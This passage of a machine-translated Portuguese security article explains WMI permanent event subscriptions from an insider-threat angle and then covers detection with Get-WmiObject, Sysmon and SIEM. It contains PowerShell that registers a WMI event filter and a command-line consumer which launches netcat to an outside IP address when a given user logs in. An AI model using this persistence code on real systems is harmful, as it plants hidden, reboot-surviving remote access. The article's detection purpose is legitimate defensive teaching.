Um insider cria um evento constante no sistema de destino, liberando-se dessa necessidade da presença em uma sessão de shell. O evento permanece lá para sempre ou até que seja excluído explicitamente. Você pode ler mais sobre como fazer isso </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aqui.</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mas, em geral, o processo é semelhante ao que fiz acima com um evento temporário. </font><font style="vertical-align: inherit;">A última coisa que nosso hacker precisa é associar um filtro de eventos a um consumidor de eventos. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Concordo que, para um funcionário comum que de repente decidiu se tornar um hacker do mal, isso parece muito legal. </font><font style="vertical-align: inherit;">Por uma questão de interesse, li vários </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fóruns</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> e vi que muitas pessoas estão lutando sem êxito para que os eventos constantes do WMI funcionem. </font><font style="vertical-align: inherit;">No entanto, isso não vai além das capacidades do nosso "Snowden" e de outros administradores de sistemas experientes que decidiram mudar para o lado obscuro.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Eventos constantes: dicas para administradores de TI</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/8c/gh/rn/8cghrnfq5mao1zm9d5-95y2kdys.jpeg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esses métodos não se destinam a treinar hackers em potencial ou funcionários ofendidos que desejam se vingar do empregador. </font><font style="vertical-align: inherit;">Tudo o que quero fazer é ajudar os profissionais de TI a entender a mentalidade do hacker para que eles possam implementar a proteção adequada contra ataques de penetração. </font><font style="vertical-align: inherit;">Para eles, mostro como configurar os objetos de filtro e consumidor usando o </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet Set-WmiInstance</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
<font></font>
EventNamespace = 'root/cimv2'<font></font>
Name = “cruella”<font></font>
Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
<font></font>
<font></font>
$command = "powershell.exe -Command {$names = gwmi Win32_Process; $users=@(); foreach ($n in $names) {$users += $n.GetOwner().User}; foreach ($u in $users) {if ($u -eq 'cruella') { C:\users\lex\Documents\nc.exe 172.31.45.240 10000}}}"<font></font>
<font></font>
<font></font>
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{<font></font>
Name = "Consumer"<font></font>
CommandLineTemplate = $Command<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sua tarefa é criar o código do PowerShell que vincula esses dois componentes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No decorrer dos meus próprios testes, pude obter um evento permanente para trabalhar no sistema de destino sem esforço e sofrimento excessivos. </font><font style="vertical-align: inherit;">Como você se lembra, isso foi muito difícil de alcançar com eventos WMI temporários que duram apenas uma sessão do PowerShell.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ao configurar um evento WMI persistente, por exemplo, para monitorar o logon dos usuários, não é necessário que um insider ou hacker permaneça no sistema de destino. Um bônus adicional é que um evento WMI persistente é robusto: quando o computador é reiniciado, os gatilhos de eventos ainda funcionam. Isso torna os eventos persistentes do WMI uma maneira poderosa e secreta de desencadear um ataque, o que pode envolver muito mais do que apenas monitorar. Como você se lembra, os eventos WMI estão longe de ser o primeiro lugar em que os especialistas em segurança procurarão a origem do ataque. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Por exemplo, o código do PowerShell para um consumidor de eventos pode atuar como iniciador e baixar malware armazenado em um servidor remoto usando o </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadString</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Ótima </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apresentação</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Matt Graber, na conferência Black Hat, contém muitas informações sobre o potencial malicioso de eventos WMI persistentes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se você é um especialista em segurança, como trabalhará com eventos WMI em termos de seu potencial uso malicioso? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Boa sorte do seu lado: usando o cmdlet Get-WmiObject (também conhecido como gwmi), você pode criar uma lista de filtros de eventos, consumidores e objetos de ligação:</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ug/ql/gd/ugqlgdjx1alwtunb4oczheoxh3k.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Você lista eventos persistentes WMI usando Get-WMIObject e define os parâmetros apropriados. </font><font style="vertical-align: inherit;">Observe a falta de um carimbo de data / hora. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora, se eles acharem suspeito o filtro (ou consumidor) de um evento permanente, os profissionais de TI poderão desativá-lo removendo-o usando o pipeline do PowerShell e o </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet WMI-RemoveObject</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/uo/t-/lj/uot-ljlw9zzi_jw5xosdyeaikwa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 A remoção de eventos WMI persistentes envolve o uso do pipeline do PowerShell. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Observe que nem a hora em que o evento foi gerado nem o nome do usuário mal-intencionado são especificados aqui. </font><font style="vertical-align: inherit;">Para obter essas informações forenses, você precisará consultar os logs de eventos do Windows. </font><font style="vertical-align: inherit;">Mais sobre isso abaixo.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Posso desativar os eventos WMI persistentes?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No mínimo, os profissionais de TI podem ver rapidamente os eventos persistentes WMI registrados e começar a analisar cenários da vida real em busca de sinais de ameaças. Talvez, como um especialista em segurança de TI experiente, você pense que nem todo mundo precisa de WMI em laptops, e a melhor estratégia para lidar com vulnerabilidades de eventos persistentes de WMI é desativar completamente o WMI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Você pode tentar desabilitar o serviço </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Winmgmt</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , que inicia o WMI. Na prática, isso não é tão simples. No decorrer dos meus próprios testes, não consegui desativar esse serviço: ele foi iniciado automaticamente novamente. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Suponha que você ainda conseguiu desativá-lo. O software administrativo do Windows depende muito do WMI e não funcionará se o Winmgmt estiver indisponível. </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;">Fóruns em</font></a><font style="vertical-align: inherit;"> toda a Internet</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">preenchido com mensagens alertando contra a desativação do WMI. </font><font style="vertical-align: inherit;">Eu aconselho você a ouvir e ter piedade de seu WMI.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Identificar eventos WMI de ameaças com Sysmon e SIEM</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em geral, você precisará aceitar a vulnerabilidade de evento WMI como um fato. Felizmente, existem maneiras mais eficientes de detectar eventos persistentes e outras operações de eventos suspeitos no Windows do que usar o cmdlet Powershell mencionado acima. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Conheça Sysmon! Não entrarei em detalhes sobre esse utilitário gratuito do Windows, que pode ser baixado </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aqui</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> neste artigo. Só posso dizer que permite obter informações muito úteis para análise em um só lugar, em vez de exibir cada log de eventos do Windows individualmente. Os usuários do Windows 7 e posteriores podem não precisar do Sysmon, pois os sistemas Windows mais recentes usam mecanismos de log padrão mais avançados.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/tv/-l/_2/tv-l_2ztyvfhhag1nf3faxi5qji.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 O Sysmon é uma ferramenta conveniente e intuitiva de registro de eventos da Microsoft, que </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
atribui o identificador de evento 19 à criação de um evento de filtro WMI permanente (20 é designado para criar um evento de consumidor WMI e 21 é atribuído à ligação WMI). Se você abrir o visualizador de eventos, encontrará o log de eventos do Sysmon na seção Microsoft -&gt; Windows -&gt; Sysmon. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Você não deseja abrir o visualizador de eventos manualmente para monitorar eventos WMI persistentes, o que pode ser um sinal de atividade de hackers. Nós sabemos como ajudá-lo. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Por que não criar um filtro de eventos persistentes WMI para monitorar a criação (adivinhado?) De um evento persistente WMI? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">github</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Há um pequeno projeto em que você encontrará o código para configurar esta operação. </font><font style="vertical-align: inherit;">Aqui está um trecho de código para um filtro de eventos WMI que permite rastrear a criação de ... sim, um filtro de eventos WMI:</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
EventNamespace = 'root/subscription'<font></font>
Name = '_PersistenceEvent_'<font></font>
Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 Where TargetInstance ISA "__EventConsumer"'<font></font>
<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Obviamente, aqui precisamos da ajuda de ferramentas de segurança da informação e gerenciamento de eventos de segurança (SIEM), porque as evidências estão enterradas nos escombros de revistas. </font><font style="vertical-align: inherit;">Eu acho que você entende para onde tudo está indo. </font><font style="vertical-align: inherit;">Você precisará de uma </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">solução de monitoramento de segurança</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> que combine os recursos do SIEM com a análise de outras ameaças para detectar e eliminar ameaças associadas a eventos WMI persistentes.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Perguntas freqüentes sobre a instrumentação de gerenciamento do Windows</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Os métodos descritos acima podem muito bem ser usados ​​para implementar um sistema de vigilância na sua rede; no entanto, você pode ter algumas perguntas sobre o WMI. </font><font style="vertical-align: inherit;">Nesta seção, responderemos aos mais comuns.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O WMI está obsoleto?</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O WMI em si não está desatualizado, mas o WMIC foi preterido, o que é confuso para muitas pessoas. </font><font style="vertical-align: inherit;">O PowerShell agora é usado para acessar as funções fornecidas anteriormente pelo WMIC.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Quais portas o WMI usa? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O WMI usa a porta TCP 135 e várias portas dinâmicas: 49152-65535 (portas RPC dinâmicas: Windows Vista, 2008 e superior), TCP 1024-65535 (portas RPC dinâmicas: Windows NT4, Windows 2000, Windows 2003). </font><font style="vertical-align: inherit;">Você também pode configurar um intervalo de portas personalizado para WMI.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O WMI usa o WimRM? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Essa configuração não é padrão, mas você pode usar o WMI para recuperar dados usando scripts ou aplicativos usando a API de script do WinRM ou usando a ferramenta de linha de comando do Winrm. </font><font style="vertical-align: inherit;">O WinRM pode usar o WMI para coletar dados de recursos ou gerenciar recursos no sistema operacional Windows.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Conclusão</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como vimos, o WMI fornece aos administradores uma ferramenta poderosa para monitorar processos e computadores remotos e pode ser usado no desenvolvimento de EUMAs (acordos de monitoramento do usuário final) para alertar automaticamente atividades suspeitas. </font><font style="vertical-align: inherit;">Isso o torna uma ótima ferramenta para detectar e eliminar ameaças internas, impedindo tentativas de burlar as políticas de segurança, além de monitorar como seus sistemas são usados. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se você quiser saber mais sobre como usar o WMI para monitorar atividades internas, faça o download do nosso guia detalhado </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aqui</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt507048/index.html">Olya, testes e fábrica - o caminho para uma bela arquitetura e código limpo</a></li>
<li><a href="../pt507050/index.html">Análise do design do jogo Hollow Knight. Parte 1. Estradas Esquecidas</a></li>
<li><a href="../pt507052/index.html">O melhor cientista de dados não perde tempo com estatísticas</a></li>
<li><a href="../pt507058/index.html">Joel Spolsky: Papel de Gamificação no Sucesso do Stack Overflow</a></li>
<li><a href="../pt507066/index.html">10 maneiras de automatizar anúncios no Google Ads</a></li>
<li><a href="../pt507074/index.html">Folha de dicas do SIMD, agora para .NET Core</a></li>
<li><a href="../pt507078/index.html">O tribunal ordenou que a mídia removesse o artigo de outra pessoa e publicasse uma refutação no Yandex principal</a></li>
<li><a href="../pt507080/index.html">Todos os copos: a história de um grande projeto de ecossistema</a></li>
<li><a href="../pt507084/index.html">Os partidos SpatialChat se tornaram populares durante a pandemia - e é improvável que terminem depois da enseada</a></li>
<li><a href="../pt507086/index.html">Converter script Bash em código C # para enviar SMS via modem usb HUAWEI E3372</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>